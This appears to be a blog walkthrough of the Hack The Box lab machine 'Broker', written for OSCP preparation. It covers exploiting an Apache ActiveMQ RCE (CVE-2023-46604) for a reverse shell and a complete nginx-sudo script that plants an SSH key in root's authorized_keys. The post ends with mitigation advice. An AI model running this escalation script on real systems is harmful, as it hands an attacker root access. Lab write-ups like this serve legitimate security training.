---
title: Broker
date: 2025-05-11
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, ApacheMQ-vulnerability, sudo-nginx-privesc] 
image: box-broker.png
media_subpath: /assets/img/posts/2025-05-11-brokerHTB/
---

## Introduction

In this walkthrough, I worked on **Broker**, an easy-difficulty Linux machine running a vulnerable version of **Apache ActiveMQ**. During enumeration, I identified the version in use and discovered it was affected by a known **Unauthenticated Remote Code Execution (RCE)** vulnerability. I exploited this RCE to gain an initial foothold on the machine as a low-privileged user.

Further enumeration revealed a **sudo misconfiguration**, where the `activemq` user was allowed to run **`/usr/sbin/nginx` with sudo privileges**. This misconfiguration is reminiscent of a recent vulnerability in **Zimbra**, where improper privilege handling can lead to escalation. I leveraged this sudo access to execute code as **root**, thereby gaining full system control.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22

Version - OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

### Port 1883

I don’t really think we should waste time with this port

[MQTT Pentesting](https://exploit-notes.hdks.org/exploit/hardware/mqtt-pentesting/)

### Port 5672

The same goes here:

[AMQP Pentesting](https://exploit-notes.hdks.org/exploit/network/protocol/amqp-pentesting/)

### Port 61613

### Port 61616

## Web

### Port 80

Version - nginx 1.18.0 (Ubuntu)

We navigating to the website we are presented with login screen.

![image.png](image%203.png)

I used `admin:admin` and got access to ActiveMQ web application.

### Port 8161

Version - Jetty 9.4.39.v20210325

Same website

### Port 61614

Nothing here.

## Exploitation

Searching for `ActiveMQ OpenWire transport 5.15.15` vulnerabilities I come across the following:

[CVE-2023-46604 ApacheMQ](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ?tab=readme-ov-file)

I used it following the instructions and was able to get a reverse shell.

1. First modify `poc-linux.xml` 
2. Make payload with msfvenom
3. Start webserver
4. Run not `.exe` file but `go` file with go run

![image.png](image%204.png)

Let’s get an interactive shell using python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

- OSCP Checklist
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits 
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

We can run `nginx` binary with sudo privileges.

![image.png](image%205.png)

I have GitHub repo where it describes how to get root shell when having sudo privileges over nginx.

[Nginx Sudo Privilege Escalation](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)

```bash
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

Nginx configuration file is written such that process is run as root, it exposes entire root directory in the line `root /`, and `PUT` method is enabled so we can PUT files using this exploit to anywhere.

After running this exploit copy private key and use it for connecting as root user.

```bash
chmod 600 root_key
ssh -i root_key root@host
```

## Mitigation

- **Update Apache ActiveMQ** to the latest stable version and regularly monitor for CVEs affecting middleware components.
- Restrict or remove unnecessary **sudo permissions**, especially for binaries like `nginx` that can be abused for privilege escalation.
- Apply the **principle of least privilege** to service accounts like `activemq`, ensuring they have only the minimum required permissions.
- Monitor sudoers configuration for **misconfigurations or overly permissive entries** using tools like `sudo -l` auditing.
- Consider **sandboxing services** like ActiveMQ and nginx using containers or systemd isolation features to limit impact in case of compromise.
